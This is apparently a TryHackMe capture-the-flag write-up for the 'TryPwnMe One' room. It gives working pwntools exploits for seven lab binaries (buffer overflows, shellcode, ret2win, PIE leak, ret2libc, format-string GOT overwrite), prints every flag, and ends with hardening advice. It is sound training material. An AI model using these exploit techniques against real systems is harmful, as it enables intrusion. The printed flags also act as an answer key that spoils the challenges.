# TryPwnMe One - TryHackMe Write-up

- **Platform:** TryHackMe
- **Room:** TryPwnMe One
- **Category:** Binary Exploitation (Pwn) / Exploit Development
- **Architecture:** x86-64 ELF (all challenges)
- **Target:** 10.49.131.138 (ports 9003 - 9009)
- **Tooling:** pwntools, objdump, checksec, ROPgadget
- **Author of write-up:** R4s4n

---

## Overview

TryPwnMe One is a collection of introductory binary-exploitation challenges. Each challenge is a small, not-stripped x86-64 ELF served over the network on its own TCP port. The goal in every case is to read the contents of `flag.txt` on the remote host, either by unlocking a hidden branch, calling a `win()` function, or spawning a shell.

The challenges progress through the fundamental pwn techniques:

1. **Stack variable overwrite** - overflow a buffer to change a control variable.
2. **Direct shellcode execution** - executable stack.
3. **Return-to-win** - overwrite the saved return address with a helper function.
4. **PIE bypass via information leak** - use a leaked address to defeat ASLR.
5. **Return-to-libc** - leak a libc address and call `system("/bin/sh")`.
6. **Format string GOT overwrite** - redirect execution through a corrupted GOT entry.

### Flag Summary

| Port | Challenge | Technique | Flag |
|------|-----------|-----------|------|
| 9003 | TryOverFlowMe 2 | Stack variable overwrite | `THM{Oooooooooooooovvvvverrrflloowwwwww}` |
| 9004 | TryOverFlowMe (variant) | Stack variable overwrite | `THM{why_just_the_A_have_all_theFun?}` |
| 9005 | TryExecMe | Shellcode on executable stack | `THM{Tr1Execm3_with_s0m3_sh3llc0de_w00t}` |
| 9006 | TryRetMe | Return-to-win | `THM{a_r3t_to_w1n_by_thm}` |
| 9007 | Random Memories | PIE leak then return-to-win | `THM{Th1s_R4ndom_acc3ss_m3mories_tututut_byp4ssed}` |
| 9008 | The Librarian | Return-to-libc | `THM{YAY_You_r3t_t0_libc_well_d0n3}` |
| 9009 | Not Specified | Format string GOT overwrite | `THM{l3arn1ng_f0rm4t_str1ngs_awes0m3}` |

---

## Triage

All binaries were identified and their protections reviewed before exploitation.

```bash
file <binary>
checksec --file=<binary>
```

| Binary | RELRO | Canary | NX | PIE | Notes |
|--------|-------|--------|----|----|-------|
| overflowme1 | Partial | No | Enabled | No | Fixed addresses |
| overflowme2 | Partial | No | Enabled | No | Fixed addresses |
| tryexecme | Partial | No | Disabled (RWX) | No | Executable stack |
| tryretme | Partial | No | Enabled | No | Static `win()` |
| random | Full | No | Enabled | Yes | Leaks its own address |
| thelibrarian | Partial | No | Enabled | No | Ships `libc.so.6` (2.27) |
| notspecified | Partial | No | Enabled | No | Format string, writable GOT |

The absence of stack canaries throughout makes straight buffer overflows viable. The specific combination of protections dictates the technique used for each challenge.

---

## Challenge 1 - TryOverFlowMe 2 (Port 9003)

### Reference behaviour

The program reads a "comment" with `gets()` into a fixed buffer and later checks an integer variable. If the variable equals a magic value, it prints `flag.txt`.

### Analysis

```bash
objdump -d -M intel overflowme2 | sed -n '/<main>:/,/ret/p'
```

Key instructions:

```asm
sub    rsp,0x50
lea    rax,[rbp-0x50]        ; buf
call   gets@plt
cmp    DWORD PTR [rbp-0x4],0x59595959
jne    <bye>
call   read_flag
```

- Buffer is at `[rbp-0x50]`.
- The check variable is at `[rbp-0x4]` and must equal `0x59595959` ("YYYY").
- Offset from the buffer to the variable is `0x50 - 0x4 = 0x4c` (76 bytes).

### Exploit

```python
from pwn import *
io = remote('10.49.131.138', 9003)
io.recvuntil(b'comment')
io.sendline(b'A'*0x4c + p32(0x59595959))
print(io.recvall(timeout=5).decode())
```

### Result

```
THM{Oooooooooooooovvvvverrrflloowwwwww}
```

---

## Challenge 2 - TryOverFlowMe (Port 9004)

### Reference behaviour

Identical concept to the previous challenge: a `gets()` buffer of 64 bytes with an `admin` integer that must equal `0x59595959`.

### Analysis and offset discovery

The supplied source implied a 64-byte buffer plus several integer locals. Rather than assume the compiler layout, the exact offset was determined empirically by testing a series of padding lengths and observing which one triggered the flag branch:

```python
from pwn import *
for off in [64, 68, 72, 76, 80]:
    io = remote('10.49.131.138', 9004)
    io.recvuntil(b'comment')
    io.sendline(b'A'*off + p32(0x59595959))
    data = io.recvall(timeout=3)
    io.close()
    if b'THM' in data:
        print("offset", off, data)
        break
```

The correct offset was **76 bytes**, after which the four-byte magic value overwrote `admin`.

### Exploit

```python
from pwn import *
io = remote('10.49.131.138', 9004)
io.recvuntil(b'comment')
io.sendline(b'A'*76 + p32(0x59595959))
print(io.recvall(timeout=5).decode())
```

### Result

```
THM{why_just_the_A_have_all_theFun?}
```

---

## Challenge 3 - TryExecMe (Port 9005)

### Reference behaviour

```c
char *buf[128];
read(0, buf, sizeof(buf));
( ( void (*)() ) buf )();   // the buffer is executed
```

The program reads attacker input into a stack buffer and then calls it as a function. Combined with an executable (RWX) stack, this allows direct shellcode execution.

### Analysis

```asm
lea    rax,[rbp-0x400]
call   read@plt
lea    rdx,[rbp-0x400]
call   rdx                  ; jump straight into our input
```

No return-address manipulation is required. The input buffer is executed directly, so raw shellcode is sufficient.

### Exploit

```python
from pwn import *
context.arch = 'amd64'
io = remote('10.49.131.138', 9005)
io.recvuntil(b'execute it')
io.sendline(asm(shellcraft.amd64.linux.sh()))
io.recvuntil(b'Spell')
io.sendline(b'cat flag.txt')
print(io.recvall(timeout=5).decode())
```

### Result

```
THM{Tr1Execm3_with_s0m3_sh3llc0de_w00t}
```

---

## Challenge 4 - TryRetMe (Port 9006)

### Reference behaviour

```c
int win(){ system("/bin/sh"); }
void vuln(){ char *buf[0x20]; read(0, buf, 0x200); }
```

The `read()` accepts far more data than the buffer holds, allowing the saved return address to be overwritten with the address of `win()`.

### Analysis

```bash
objdump -d -M intel tryretme | grep -E "<win>:"
# 00000000004011dd <win>
```

- `vuln` buffer is at `[rbp-0x100]`; the offset to the saved return address is `0x100 + 8 = 264` bytes.
- `win` is at `0x4011dd`.
- Because `win` calls `system`, the stack must be 16-byte aligned at the `call`; a bare `ret` gadget is inserted before `win` to fix alignment (avoids a `movaps` crash).

```bash
ROPgadget --binary tryretme | grep ": ret$"
# 0x000000000040101a : ret
```

### Exploit

```python
from pwn import *
win = 0x4011dd
ret = 0x40101a
io = remote('10.49.131.138', 9006)
io.recvuntil(b'?')
io.send(b'A'*264 + p64(ret) + p64(win))
io.recvuntil(b"go!")
io.sendline(b'cat flag.txt')
print(io.recvall(timeout=5).decode())
```

### Result

```
THM{a_r3t_to_w1n_by_thm}
```

---

## Challenge 5 - Random Memories (Port 9007)

### Reference behaviour

```c
void vuln(){
    char *buf[0x20];
    printf("I can give you a secret %llx\n", &vuln);   // address leak
    read(0, buf, 0x200);
}
```

The binary is PIE, so addresses are randomised. However, it prints the runtime address of `vuln`, which is enough to recover the image base and locate `win()`.

### Analysis

```bash
objdump -d -M intel random | grep -E "<win>:|<vuln>:"
# 0000000000001210 <win>
# 0000000000001319 <vuln>
```

- Image base = `leaked_vuln - 0x1319`.
- `win` = base + `0x1210`; `ret` gadget = base + `0x101a`.
- Buffer offset to saved return address is again 264 bytes.

The service also prints a coloured ASCII banner, so the leak must be parsed by scanning for the `secret ` marker rather than reading a fixed line.

### Exploit

```python
from pwn import *
context.arch = 'amd64'
io = remote('10.49.131.138', 9007)
io.recvuntil(b'secret ')
vuln = int(io.recvline().strip(), 16)
base = vuln - 0x1319
win  = base + 0x1210
ret  = base + 0x101a
io.recvuntil(b'?')
io.send(b'A'*264 + p64(ret) + p64(win))
io.recvuntil(b"go!")
io.sendline(b'cat flag.txt')
print(io.recvall(timeout=5).decode())
```

### Result

```
THM{Th1s_R4ndom_acc3ss_m3mories_tututut_byp4ssed}
```

---

## Challenge 6 - The Librarian (Port 9008)

### Reference behaviour

```c
void vuln(){ char *buf[0x20]; read(0, buf, 0x200); }
int main(){ setup(); vuln(); }
```

There is no `win()` function, so exploitation requires return-to-libc. The room supplies the exact `libc.so.6` (glibc 2.27) and `ld-linux-x86-64.so.2`.

### Analysis

The binary is non-PIE with Partial RELRO, so the GOT is readable and PLT stubs are at fixed addresses. The plan is a classic two-stage ret2libc:

1. **Stage 1 (leak):** call `puts(puts@got)` to leak the runtime address of `puts`, then return to `main` to run `vuln` again.
2. **Stage 2 (shell):** compute the libc base from the leak and call `system("/bin/sh")`.

Gadgets and addresses:

```bash
ROPgadget --binary thelibrarian | grep "pop rdi ; ret"   # 0x400639
# ret gadget: 0x4004c6
objdump -R thelibrarian | grep puts                       # puts@got 0x601018
# puts@plt 0x4004e0 ; main 0x40067d ; vuln 0x40063e
```

Libc offsets from the supplied library:

```python
libc = ELF('libc.so.6')
# puts   0x80970
# system 0x4f420
# /bin/sh 0x1b3d88
```

The buffer offset to the saved return address is 264 bytes. A `ret` gadget is used before the final `system` call for 16-byte stack alignment.

### Exploit

```python
from pwn import *
context.arch = 'amd64'

pop_rdi = 0x400639
ret     = 0x4004c6
puts_plt= 0x4004e0
puts_got= 0x601018
main    = 0x40067d
off     = 264

puts_off, system_off, binsh_off = 0x80970, 0x4f420, 0x1b3d88

io = remote('10.49.131.138', 9008)

# Stage 1: leak puts, return to main
io.recvuntil(b': ')
io.send(b'A'*off + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main))
io.recvuntil(b"go!\n")
io.recvline()                       # blank line
leak = io.recvline().strip(b'\n')
puts_leak = u64(leak.ljust(8, b'\x00'))
base   = puts_leak - puts_off
system = base + system_off
binsh  = base + binsh_off

# Stage 2: system("/bin/sh")
io.recvuntil(b': ')
io.send(b'A'*off + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system))
io.recvuntil(b"go!")
io.sendline(b'cat flag.txt')
print(io.recvall(timeout=5).decode())
```

### Result

```
THM{YAY_You_r3t_t0_libc_well_d0n3}
```

---

## Challenge 7 - Not Specified (Port 9009)

### Reference behaviour

```c
int win(){ system("/bin/sh"); }
int main(){
    char *username[32];
    read(0, username, sizeof(username));
    printf(username);      // format string vulnerability
    exit(1);
}
```

The user input is passed directly to `printf` as the format string, giving an arbitrary read/write primitive. A `win()` function exists, and `exit()` is called immediately after the vulnerable `printf`.

### Analysis

The parameter offset of the input buffer was found by sending a marker plus `%p` specifiers:

```python
io.send(b'AAAA' + b'.%p'*10 + b'\n')
# ... 0x2e70252e41414141 ...   <- contains 0x41414141 ("AAAA") at parameter 6
```

The controllable format-string arguments begin at **offset 6**.

Exploitation strategy: overwrite the GOT entry for `exit` (`0x404048`) with the address of `win` (`0x4011f6`). When the program subsequently calls `exit(1)`, control is redirected to `win`, spawning a shell. The binary is non-PIE, so `win` has a fixed address.

### Exploit

```python
from pwn import *
context.arch = 'amd64'
exit_got = 0x404048
win      = 0x4011f6

io = remote('10.49.131.138', 9009)
payload = fmtstr_payload(6, {exit_got: win}, write_size='short')
io.recvuntil(b'username')
io.sendline(payload)
io.recvuntil(b'bye', timeout=3)      # exit() now jumps to win()
io.sendline(b'cat flag.txt')
print(io.recvall(timeout=5).decode())
```

### Result

```
THM{l3arn1ng_f0rm4t_str1ngs_awes0m3}
```

---

## Key Takeaways

| Concept | Lesson |
|---------|--------|
| Unbounded input (`gets`, oversized `read`) | Never trust input size; these are the root cause of every overflow here. |
| Executable stack | RWX memory turns a simple buffer into arbitrary code execution. |
| Missing stack canaries | Allows straightforward return-address overwrites. |
| PIE without secrecy | An address leak completely defeats PIE/ASLR. |
| Return-to-libc | When no useful gadgets exist in the binary, the libc provides `system` and `/bin/sh`. |
| Stack alignment | 16-byte alignment (`movaps`) matters; insert a `ret` gadget before library calls. |
| Format strings | Passing user data as a format string yields read and write primitives; GOT overwrite converts this into control-flow hijacking. |

## Remediation Recommendations

- Replace unsafe input functions (`gets`) with bounded equivalents; validate all read lengths against the destination size.
- Compile with stack canaries (`-fstack-protector-strong`), full RELRO (`-Wl,-z,relro,-z,now`), PIE (`-fPIE -pie`), and a non-executable stack.
- Never pass user-controlled data as a format string; always use a constant format specifier (for example `printf("%s", user)`).
- Do not expose internal addresses (such as function pointers) in program output.

## Flags

| # | Flag |
|---|------|
| 9003 | `THM{Oooooooooooooovvvvverrrflloowwwwww}` |
| 9004 | `THM{why_just_the_A_have_all_theFun?}` |
| 9005 | `THM{Tr1Execm3_with_s0m3_sh3llc0de_w00t}` |
| 9006 | `THM{a_r3t_to_w1n_by_thm}` |
| 9007 | `THM{Th1s_R4ndom_acc3ss_m3mories_tututut_byp4ssed}` |
| 9008 | `THM{YAY_You_r3t_t0_libc_well_d0n3}` |
| 9009 | `THM{l3arn1ng_f0rm4t_str1ngs_awes0m3}` |
